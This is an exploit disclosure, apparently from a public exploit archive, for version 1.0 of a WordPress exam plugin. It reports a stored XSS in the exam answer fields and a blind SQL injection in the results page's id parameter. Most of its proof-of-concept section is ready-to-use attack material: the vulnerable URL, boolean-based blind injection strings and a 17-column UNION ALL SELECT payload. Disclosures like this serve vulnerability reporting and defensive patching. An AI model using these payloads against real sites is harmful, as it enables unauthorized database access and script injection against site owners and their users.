@@ -1,0 +1,52 @@
+# Exploit Title: IBPS Online Exam Plugin for WordPress v1.0 - XSS SQLi
+# Date: 2017-07-11
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://elfemo.com/demo/server2/order2032/
+# Software Link: https://codecanyon.net/item/ibps-online-exam-plugin-for-wordpress/20028534
+# Version: 1.0
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.5]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-07-20
+
+Product & Service Introduction:
+===============================
+A Full Featured WordPress Plugin for IBPS Examination.
+
+Technical Details & Description:
+================================
+
+Stored XSS on exam input textfields.
+
+Blind SQL Injection on examapp_UserResult page id parameter.
+
+Proof of Concept (PoC):
+=======================
+
+Authenticated Stored XSS:
+
+Logged as a student:
+Write the payload in the input textfields while attempting an exam. The payload will execute on My Results > View Details:
+https://localhost/wp-admin/admin.php?page=examapp_UserResult&info=view&id=[xx]
+
+Blind SQL Injection
+
+Logged as a student:
+
+https://localhost/wp-admin/admin.php?page=examapp_UserResult&info=view&id=79 and 1=1
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=examapp_UserResult&info=view&id=78 AND 6705=6705
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: page=examapp_UserResult&info=view&id=-4748 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178716b71,0x6b4c5247597261614e73447378544741764b4f7172597a5a58494551685a7056644d6e595773496e,0x7162787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KttP
+
+Credits & Authors:
+==================
+8bitsec - [https://twitter.com/_8bitsec]
